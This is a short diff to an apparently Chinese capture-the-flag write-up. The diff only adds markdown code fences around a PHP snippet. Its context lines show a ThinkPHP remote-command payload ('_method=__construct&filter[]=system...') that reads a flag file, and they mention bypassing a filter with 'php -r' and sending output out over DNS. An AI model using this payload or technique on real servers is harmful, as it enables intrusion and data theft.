@@ -99,6 +99,7 @@ POST：_method=__construct&filter[]=system&server[REQUEST_METHOD]=cat /flag
 
 源码删减：
 
+```php
 {% highlight php linenos %}
 <?php
 error_reporting(0);
@@ -117,6 +118,8 @@ if (!isset($_POST['girl_friend'])) {
     }
 }
 {% endhighlight %}
+```
+
 
 拦截形同虚设，可以用"php -r"执行PHP代码。不过没有回显，需要将结果打到DNS上。
 
